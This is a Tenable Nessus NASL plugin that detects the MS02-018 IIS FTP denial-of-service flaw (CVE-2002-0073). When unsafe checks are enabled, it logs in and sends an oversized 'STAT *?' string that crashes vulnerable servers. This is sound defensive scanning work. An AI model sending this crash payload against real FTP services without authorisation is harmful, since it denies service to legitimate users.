#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

# Thanks to: H D Moore

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(10934);
  script_version("1.53");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2002-0073");
  script_bugtraq_id(4482);
  script_xref(name:"MSFT", value:"MS02-018");
  script_xref(name:"MSKB", value:"319733");

  script_name(english:"MS02-018: Microsoft IIS FTP Status Request DoS (uncredentialed check)");

  script_set_attribute(attribute:"synopsis", value:
"The remote FTP server is prone to a denial of service attack.");
  script_set_attribute(attribute:"description", value:
"It was possible to make the remote FTP server crash by sending the
command 'STAT *?AAAAA....AAAAA'.

There is a bug in certain versions of Microsoft's FTP server that can
be exploited in this fashion. Other FTP servers may also react
adversely to such a string. An attacker may leverage this issue to
crash the affected service and deny usage to legitimate users.");
  script_set_attribute(attribute:"see_also", value:"https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2002/ms02-018");
  script_set_attribute(attribute:"solution", value:
"Microsoft has released a set of patches for IIS 4.0, 5.0, and 5.1.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(attribute:"vuln_publication_date", value:"2002/04/10");
  script_set_attribute(attribute:"plugin_publication_date", value:"2002/04/10");

  script_set_attribute(attribute:"potential_vulnerability", value:"true");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/o:microsoft:windows");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:microsoft:internet_information_server");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_DENIAL);
  script_family(english:"FTP");

  script_copyright(english:"This script is Copyright (C) 2002-2022 Tenable Network Security, Inc.");

  script_dependencies("ftpserver_detect_type_nd_version.nasl", "ftp_anonymous.nasl", "iis_asp_overflow.nasl", "ftp_kibuv_worm.nasl");
  script_require_keys("Settings/ParanoidReport");
  script_require_ports("Services/ftp", 21);

  exit(0);
}

include("audit.inc");
include("ftp_func.inc");
include("global_settings.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

if ( get_kb_item("Q319733") ) exit(0);

port = get_ftp_port(default: 21);


if(!safe_checks())
{
 login = get_kb_item("ftp/login");
 password = get_kb_item("ftp/password");
 if(login)
 {
 # Connect to the FTP server
  soc = open_sock_tcp(port);
  if(soc)
  {
  if(ftp_authenticate(socket:soc, user:login, pass:password))
  {
     # We are in
     c = string("STAT *?", crap(240), "\r\n");
     send(socket:soc, data:c);
     b = ftp_recv_line(socket:soc);
     send(socket:soc, data:string("HELP\r\n"));
     r = ftp_recv_line(socket:soc);
     if(!r)security_warning(port);
     else {
     ftp_close(socket: soc);
     }
    exit(0);
   }
  }
 }
}
